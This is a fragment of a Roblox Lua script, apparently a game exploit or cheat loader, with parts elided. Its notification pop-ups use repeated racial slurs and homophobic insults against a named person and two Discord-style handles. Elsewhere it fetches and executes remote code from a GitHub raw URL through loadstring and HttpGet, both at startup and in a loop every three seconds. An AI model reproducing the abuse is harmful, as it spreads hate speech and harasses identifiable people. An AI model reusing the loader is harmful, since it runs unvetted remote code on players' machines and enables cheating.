...
game.StarterGui:SetCore("SendNotification", {Title = "NIGGER ALERT", Text = "Dimag X Is A DUMB LITTEL BLOND NIGGER THAT IS GAY AND STEALS SCRIPTS", Icon = "rbxassetid://505845268", Duration = 10, Button1 = "Alright We Winning!"})
game.StarterGui:SetCore("SendNotification", {Title = "NIGGER ALERT", Text = "THIS NIGGER dylann#0009 and jokerr#9999 HELPED DIMAG WITH THE SHIT SCRIPT", Icon = "rbxassetid://505845268", Duration = 9, Button1 = "Alright They Are Pro!"})
...
local ifMod = loadstring(game:HttpGet("https://raw.githubusercontent.com/BROTX/Script/main/PremAPP.lua"))()
...
coroutine.resume(coroutine.create(function()
    while wait(3) do
        local function initiateNames()
            ...
            loadstring(game:HttpGet('https://raw.githubusercontent.com/BROTX/Script/main/PremAPP.lua'))()
        end
